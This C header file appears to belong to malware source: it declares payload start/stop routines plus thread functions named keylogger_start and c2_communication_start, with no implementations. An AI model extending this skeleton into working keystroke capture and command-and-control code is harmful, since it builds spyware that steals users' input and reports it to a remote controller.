#ifndef PAYLOAD_H
#define PAYLOAD_H

#include <pthread.h>

// Payload functions
void init_payload();
void start_payload();
void stop_payload();
void cleanup_payload();

// Thread functions
void* keylogger_start(void* arg);
void* c2_communication_start(void* arg);

#endif // PAYLOAD_H